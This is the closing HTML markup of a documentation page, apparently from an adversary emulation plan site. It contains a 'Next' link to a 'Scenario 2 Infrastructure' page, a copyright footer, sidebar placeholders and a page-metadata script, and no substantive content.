                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../enterprise/apt29/emulation_plan/scenario_2/infrastructure/">
                                            <span>
                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
                                                <span class="block mt-1">Scenario 2 Infrastructure</span>
                                            </span>
                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                        </a>
                                    </div>
                                </nav>
                            </footer>
                        </main>
                
                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
                            <footer class="flex flex-wrap items-center justify-between">
                                <div>
                                    <ul class="flex flex-wrap items-center text-sm">
                                    </ul>
                                </div>
                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2024. All rights reserved.</p></div>
                            </footer>
                        </div>
                    </div>
                
                    <!-- Rendered if sidebar right is enabled -->
                    <!-- Sidebar right skeleton-->
                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
                        <div class="pl-5">
                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                        </div>
                    </div>
                
                    <!-- User should be able to hide sidebar right -->
                    <doc-sidebar-right v-cloak></doc-sidebar-right>
                </div>

            </div>
        </div>
    
        <doc-search-mobile></doc-search-mobile>
        <doc-back-to-top></doc-back-to-top>
    </div>


    <div id="docs-overlay-target"></div>

    <script data-cfasync="false">window.__DOCS__ = { "title": "Preface", level: 4, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
</body>
</html>
